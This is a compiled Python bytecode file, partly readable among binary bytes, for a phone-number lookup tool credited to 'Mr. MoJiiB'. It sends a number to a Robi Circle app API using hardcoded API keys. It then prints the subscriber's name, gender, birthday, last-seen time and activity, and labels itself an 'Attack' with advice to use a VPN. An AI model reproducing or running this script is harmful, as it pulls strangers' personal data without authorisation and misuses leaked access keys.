o
    f��b�  �                   @   s�  d dl Z e �d� d dl Z e �d� ed� d dlZd dl Z d dlZd dlZd dlZdZdZdZ	dZ
d	Zd
ZdZdZdd� Zeeed ��Ze �d� eed � e�d�Zeed � ee	d � eed e	 d e d � e�d� ee
de�� d � eed � ee
d � d dlZd dlZd dlZd dlZd dlZd dlZd dlmZ eed � d dlZd dlZd dlZd dlmZ d dlmZmZmZmZ e
d ZeD ]Zej �!e� ej �"�  e�d � q�d!e Z#e� Z$d"e$d#< d$e$d%< d&e$d'< z	eje#e$d(�Z%W n   ed)� Y e%�� d* d+k�reed, � �n@�z4e
d- e e%�� d. d/  e
 d0 e e%�� d. d1  e
 d2 e e%�� d. d3  e
 d4 e e%�� d. d5  e
 d6 e e%�� d. d7  e
 d8 e e%�� d. d9  e
 d: e e%�� d. d;  e
 d< e e%�� d. d=  e
 d> e e%�� d. d?  e
 d@ e dA e
 dB e e%�� d. dC  e
 dD e e%�� d. dE  e
 dF e e%�� d. dG  e
 dH e e%�� d. dI  e
 dJ e e%�� d. dK  e
 dL e e%�� d. dM  dN Ze%�� d. dO dPk�ree
dQ e dR � n
ee
dS e dT � e%�� d. dU dVk�r0ee
dW e dR � n
ee	dX e dT � eD ]Zej �!e� ej �"�  e�d� �q<W n
   eedY � Y eee	dZ e
 d[ e	 d\ ��Z&e �d� dS )]�    N�clearzlolcat banner.py�
z[1;90mz[1;91mz[1;92mz[1;93mz[1;94mz[1;95mz[1;96mz[1;97mc                 C   s2   | d D ]}t j�|� t j��  t�d� qd S )Nr   �{�G�z�?)�sys�stdout�write�flush�time�sleep)ZJoNyZword� r   �	nbtoid.py�	logoprint   s
   
�r   z
[>] Enter ID Number: z4
==================================================
zhttps://ipinfo.io/jsonz	 DEVELOPED BY : Mr. MoJiiBz	 VERSION 	  : 3.0u   	 ♥♥z	 Mr. MoJiiBr   z	 Your IP Addreds:- Zipz3
==================================================z$  To Stop Attack press CTRL + Z....
)�CaseInsensitiveDictz 
)r
   )�init�Fore�Back�Styleu&   [♦] Circle Details In This Number: 
g�������?zMhttps://circle.robi.com.bd/mylife/appapi/appcall.php?op=getUserInfo&msisdn=88�gzipz
User-AgentZ(000oc0so48owkw4s0wwo4c00g00804w80gwkw8kgz	x-app-keyZ e83c79e65b2ea6c16b30b3ad5b16c238z	x-api-key)�headerszuse vpnZrdescz	Not foundu   
	 [×] User Not foundz[>] CIRCLE ID  	 : 	�dataZnicknamez
[>] NUMBER	 : 	Zmsisdnz
[>] NAME 	 : 	�namez
[>] POINTS	 : 	Zpointsz
[>] FOLLOWERS	 : 	Z	followersz
[>] FOLLOWING 	 : 	Z	followingz
[>] SHOUT	 : 	Zupdatesz
[>] COMMENTS 	 : 	Zcommentsz
[>] FRIENDS	 : 	Zfriendsz
[>] POWERED BY 	 : 	� zMr. MoJiiB
[>] LAST SHOUT	 : 	Zmlstatusz
[>] GENDER	 : 	Zgenderz
[>] BIRTHDAY	 : 	Zbirthdayz
[>] LASTSEEN 	 : 	Z	timestampz
[>] START DATE 	 : 	Z
start_datez
[>] END DATE 	 : 	Zend_datez

�type�1z[>] APP ACCESS	 :	ZOFFz
[>] APP ACCESS	 :	ZONZ	status_id�0z[>] STATUS ID 	 :	z[>] STATUS ID	 :	z' 
	 [!] Something Went Wrong..Try Againz 
	Pressz Enterz To Exit)'�os�system�printZasyncior   Zrequestsr	   ZbiblackZbiredZbigreenZbiyellowZbiblueZbipurpleZbicyanZbiehiter   �str�input�b�getZresponser
   ZjsonZrequests.structuresr   Zcoloramar   r   r   r   Zwords�charr   r   r   Zurlr   ZrespZxnr   r   r   r   �<module>   s�    




	

�� 
� 